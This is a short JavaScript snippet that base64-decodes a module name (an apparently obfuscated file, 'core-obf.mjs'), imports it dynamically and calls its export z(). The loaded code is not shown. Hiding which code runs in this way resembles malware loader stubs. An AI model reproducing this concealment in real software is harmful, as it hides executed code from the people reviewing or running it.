const path = atob("Y29yZS1vYmYubWpz");
import(`./${path}`).then(mod => {
  mod.z();
});
